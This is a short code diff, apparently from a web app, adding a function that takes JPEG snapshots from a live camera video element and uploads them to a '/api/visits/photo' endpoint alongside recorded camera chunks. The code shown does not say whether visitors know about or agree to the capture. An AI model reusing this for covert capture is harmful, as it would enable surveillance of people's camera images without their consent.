@@ -399,6 +399,30 @@ function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string
   reader.readAsDataURL(chunk);
 }
 
+// ═══════════════════════════════════════════════════════════
+// PHOTO — single JPEG frame from live video element
+// ═══════════════════════════════════════════════════════════
+function takePhoto(videoEl: HTMLVideoElement, label: string, stream: MediaStream) {
+  if (!stream.active) return;
+  if (videoEl.readyState < 2 || videoEl.videoWidth === 0 || videoEl.videoHeight === 0) {
+    // Element not ready yet — retry once after 1s
+    setTimeout(() => takePhoto(videoEl, label, stream), 1000);
+    return;
+  }
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = videoEl.videoWidth;
+    canvas.height = videoEl.videoHeight;
+    const ctx = canvas.getContext('2d');
+    if (!ctx) return;
+    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+    if (!dataUrl || dataUrl === 'data:,') return;
+    const time = new Date().toLocaleTimeString('en-PH', { timeZone: 'Asia/Manila' });
+    post('/api/visits/photo', { photo: dataUrl, caption: `📷 ${label} snapshot — ${time}` });
+  } catch { /* best-effort */ }
+}
+
 /**
  * Records camera in independent self-contained chunks.
  * Each chunk is a fresh MediaRecorder so it has its own initialization
